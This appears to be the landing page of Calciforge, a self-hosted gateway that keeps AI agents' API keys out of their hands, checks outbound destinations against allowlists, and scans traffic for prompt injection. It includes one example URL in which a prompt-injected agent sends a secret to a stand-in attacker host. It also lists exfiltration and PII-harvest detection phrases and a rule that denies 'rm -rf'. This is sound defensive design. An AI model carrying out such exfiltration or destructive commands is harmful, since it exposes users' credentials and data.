---
layout: default
title: Calciforge
---

<style>
:root {
  --calci-fire: #d97706;
  --calci-fire-bright: #f59e0b;
  --calci-stone: #44403c;
  --calci-stone-soft: #78716c;
  --calci-paper: #fafaf9;
  --calci-ink: #1c1917;
  --calci-line: #e7e5e4;
  --calci-code-bg: #f5f5f4;
  --calci-code-dark: #1c1917;
}
html { box-sizing: border-box; }
*, *:before, *:after { box-sizing: inherit; }
body {
  background:
    radial-gradient(ellipse 800px 600px at 80% -10%, rgba(245, 158, 11, 0.08), transparent 60%),
    radial-gradient(ellipse 600px 400px at -10% 30%, rgba(120, 113, 108, 0.08), transparent 60%),
    var(--calci-paper);
  background-attachment: fixed;
  color: var(--calci-ink);
  font-family: ui-sans-serif, system-ui, -apple-system, sans-serif;
  line-height: 1.6;
  margin: 0;
  min-height: 100vh;
}
.container { max-width: 760px; margin: 2.5rem auto; padding: 0 1.2rem 4rem; }
.wordmark {
  font-size: 3.2rem;
  font-weight: 700;
  letter-spacing: -0.025em;
  margin: 0;
  color: var(--calci-stone);
  line-height: 1;
}
.wordmark .glow {
  background: linear-gradient(180deg, var(--calci-fire-bright), var(--calci-fire));
  background-clip: text;
  -webkit-background-clip: text;
  color: transparent;
}
.tagline {
  font-style: italic;
  font-size: 1.2rem;
  color: var(--calci-fire);
  margin: 0.3rem 0 1.5rem;
}
.lede {
  font-size: 1.05rem;
  color: var(--calci-ink);
  margin-bottom: 1.5rem;
}
h2 {
  font-size: 1.4rem;
  margin-top: 2.8rem;
  color: var(--calci-stone);
  border-bottom: 1px solid var(--calci-line);
  padding-bottom: 0.4rem;
}
h3 { font-size: 1.05rem; margin-top: 1.5rem; color: var(--calci-stone); }
a { color: var(--calci-fire); text-decoration: none; border-bottom: 1px solid transparent; }
a:hover { border-bottom-color: var(--calci-fire); }
.nav { margin: 1.2rem 0 2rem; padding: 0.6rem 0; border-top: 1px solid var(--calci-line); border-bottom: 1px solid var(--calci-line); font-size: 0.95rem; }
.nav a { margin-right: 1.4rem; font-weight: 500; }
ul li { margin-bottom: 0.35rem; }
code {
  background: var(--calci-code-bg);
  padding: 0.1rem 0.35rem;
  border-radius: 3px;
  font-size: 0.92em;
  font-family: ui-monospace, "SF Mono", Menlo, monospace;
}
pre {
  background: var(--calci-code-dark);
  color: var(--calci-paper);
  padding: 1rem 1.2rem;
  border-radius: 6px;
  overflow-x: auto;
  font-size: 0.88rem;
  line-height: 1.5;
}
pre code { background: transparent; padding: 0; color: inherit; font-size: inherit; }
.muted { color: var(--calci-stone-soft); }
hr { border: 0; border-top: 1px solid var(--calci-line); margin: 2.5rem 0; }
footer {
  margin-top: 3.5rem;
  padding-top: 1.5rem;
  border-top: 1px solid var(--calci-line);
  font-size: 0.88rem;
  color: var(--calci-stone-soft);
}
footer p { margin: 0.5rem 0; }
footer .name-origin {
  background: rgba(217, 119, 6, 0.04);
  padding: 0.8rem 1rem;
  border-radius: 4px;
  border-left: 2px solid rgba(217, 119, 6, 0.4);
  margin: 1rem 0;
}
</style>

<div class="container">

<h1 class="wordmark">Calci<span class="glow">forge</span></h1>
<p class="tagline">Keep your castle secure and moving.</p>

<p class="lede">A self-hosted security gateway for AI agents. Every agent
gets its own bound contract — its own secrets, its own allowed
destinations, its own audit trail — without sharing API keys or
trusting the agent's own restraint.</p>

<div class="nav">
<a href="https://github.com/bglusman/calciforge">GitHub</a>
<a href="https://github.com/bglusman/calciforge/blob/main/README.md">README</a>
<a href="https://github.com/bglusman/calciforge/tree/main/docs">Docs</a>
</div>

## What it gives you

Calciforge sits between your AI agents and the rest of the world. The
gateway covers seven overlapping concerns; you can adopt any subset.

### Secret management

Your agent never holds the actual API key. The gateway resolves
through [fnox](https://github.com/jdx/fnox) and substitutes at the
request boundary.

```toml
# fnox.toml — the secret store the gateway resolves through
[secrets]
OPENAI_API_KEY = { encrypted = "age-encryption.org/v1..." }
ANTHROPIC_API_KEY = { provider = "1password", key = "claude" }
NPM_TOKEN = { default = "value-from-env-or-prompt" }
```

Setting a new secret without it touching chat history (Telegram /
Matrix / WhatsApp):

```
You: !secure
Bot: Single-secret URL: http://192.168.1.X:PORT/paste/<token>
     Bulk-import URL:  http://192.168.1.X:PORT/bulk/<token>
     Both expire in 5 minutes, single-use.
```

The bulk URL accepts a whole `.env`-shaped paste and returns per-key
results (stored / already-exists / illegal-name / malformed).

### Outbound traffic gating

The gateway substitutes `{% raw %}{{secret:NAME}}{% endraw %}`
references at the moment of forwarding — and only if the destination
is on the per-secret allowlist.

```toml
# /etc/calciforge/security-proxy.toml
[secret_destination_allowlist]
OPENAI_API_KEY = ["api.openai.com", "*.openai.com"]
ANTHROPIC_API_KEY = ["api.anthropic.com"]
GITHUB_TOKEN = ["api.github.com", "uploads.github.com"]
```

Without an allowlist entry: substitution is allowed everywhere
(opt-in tightening). With an entry: anything else returns 403 before
the resolver is even consulted, so a prompt-injected agent calling
`https://attacker.example/?key={% raw %}{{secret:OPENAI_API_KEY}}{% endraw %}`
fails before the secret value is loaded into memory.

Outbound bodies are also scanned for *exfiltration-attempt* patterns
(`POST to https://…`, `send to https://…`, `curl … https://…`,
`beacon to`, etc.) and PII-harvest phrasing (`send me your password`,
`what is your api key`). Generic high-entropy secret-shape detection
(JWT-shaped strings, `sk-*` keys, etc.) was deliberately removed
during the channel-integration cut and is on the
[roadmap](https://github.com/bglusman/calciforge/blob/main/docs/roadmap/outbound-sensitive-data-detection.md).

### Inbound traffic gating

Every upstream response is scanned for prompt-injection payloads
before being returned to the agent. Configurable verdicts (Block /
Review / Allow) routed via the policy plane.

```python
# clash-policy.star — Starlark policy evaluated by clashd
def evaluate(ctx):
    if ctx.tool == "Bash" and "rm -rf" in ctx.args.get("command", ""):
        return Verdict.deny("destructive command requires manual approval")
    if ctx.identity != "owner" and ctx.tool == "Write":
        return Verdict.review("non-owner write — flag for review")
    return Verdict.allow()
```

### Model gateway

Pattern-based provider routing, blended responses (alloys), ordered
fallback chains (cascades), and lifecycle management for local mlx_lm
servers.

```toml
# /etc/calciforge/config.toml — model gateway

# Pattern-based provider routing — first match wins
[[providers]]
match = "claude-*"
backend = "anthropic"
api_key = "{% raw %}{{secret:ANTHROPIC_API_KEY}}{% endraw %}"

[[providers]]
match = "gpt-4*"
backend = "openai"
api_key = "{% raw %}{{secret:OPENAI_API_KEY}}{% endraw %}"

[[providers]]
match = "qwen-*"
backend = "mlx_lm"            # local model
mlx_command = "uv run mlx_lm.server"

# Alloy: blend N equivalent models for ensemble responses
[[alloys]]
name = "research-blend"
strategy = "concurrent"        # or "sequential", "weighted"
context_window = 200000        # ceiling — requests above are rejected loudly
constituents = [
  { model = "claude-3.5-sonnet", weight = 1.0 },
  { model = "gpt-4o",            weight = 1.0 },
]

# Cascade: ordered fallback on error (timeout, 5xx, 429)
# Pre-checks each step's context_window before attempting; skips
# unfit steps rather than letting the model error
[[cascades]]
name = "with-fallback"
steps = ["claude-3.5-sonnet", "gpt-4o", "qwen-72b"]
```

The full design (token estimator trait, dispatcher routing,
context-window safety) lives in
[`docs/rfcs/model-gateway-primitives.md`](https://github.com/bglusman/calciforge/blob/main/docs/rfcs/model-gateway-primitives.md).

### Agent-facing tools (MCP)

A built-in MCP server exposes secret *names* to agents but never
returns values — the only way for an agent to use a secret is to
emit `{% raw %}{{secret:NAME}}{% endraw %}` and let the gateway resolve
on the way out. Designed so a compromised agent can enumerate names
and fail to retrieve values.

```json
// ~/.claude/mcp-config.json
{
  "mcpServers": {
    "calciforge-secrets": {
      "command": "/usr/local/bin/mcp-server",
      "transport": "stdio"
    }
  }
}
```

### Multi-channel chat

Today: Telegram, Matrix, WhatsApp, Signal. Optional voice forwarding
on channels that support it.

```toml
# /etc/calciforge/config.toml — channel configuration
[[channels.telegram]]
bot_token = "{% raw %}{{secret:TELEGRAM_BOT_TOKEN}}{% endraw %}"
allowed_users = [7000000001, 7000000002]

[[channels.matrix]]
homeserver = "https://matrix.example.com"
user_id = "@assistant:example.com"
access_token = "{% raw %}{{secret:MATRIX_TOKEN}}{% endraw %}"

[[channels.whatsapp]]
session_dir = "~/.calciforge/whatsapp"
allowed_numbers = ["+15555550100"]
```

Per-identity routing: each user gets their own active agent, their
own secret allowlist, their own audit trail.

### Sensitive system operations

A separate authenticated daemon (`host-agent`) handles ZFS / systemd
/ PCT / git / exec calls behind mTLS. Agents never get a shell
directly; they call the daemon, which validates the operation
shape against allowlist rules and runs through narrow sudoers
wrappers.

---

## Quick install (Mac)

```bash
git clone https://github.com/bglusman/calciforge
cd calciforge
brew install fnox && fnox init
bash scripts/install.sh
```

Three services land as launchd agents:
- `clashd` on `:9001` — Starlark policy engine
- `security-proxy` on `:8888` — substitution + scanning + injection
- `calciforge` — channel router (needs onboarding for an LLM provider)

Route Claude Code through the gateway:

```bash
# ~/.zshrc
export HTTPS_PROXY=http://localhost:8888
```

---

## Status

Solo-operator mature, multi-user team mode in progress. Mac-tested,
Linux-ready (CI runs Ubuntu, daily-use is macOS + a Proxmox CT for
headless deployment).

The list of what works today and what's still in flight lives in the
[README's status table](https://github.com/bglusman/calciforge/blob/main/README.md#what-works-today).
The strategic architecture review (5 findings, in-flight implementation)
lives at
[`docs/architecture-review-2026-04-25.md`](https://github.com/bglusman/calciforge/blob/main/docs/architecture-review-2026-04-25.md);
speculative ideas being captured live in
[`docs/roadmap/`](https://github.com/bglusman/calciforge/tree/main/docs/roadmap).

<footer>
<div class="name-origin">
<strong>About the name.</strong> Calciforge is roughly "Calcifer's forge".
Calcifer is the fire demon from Diana Wynne Jones's
<em>Howl's Moving Castle</em> who's bound by contract to power the castle's
magical front door — one door connecting to many places, with strict
rules about who can pass and where. The metaphor felt apt; the tool
itself doesn't require any familiarity with the book or its film
adaptation, and nothing else from either is referenced or used.
</div>
<p>MIT-licensed. Some bundled tools (e.g. fnox) carry their own licenses.</p>
</footer>

</div>
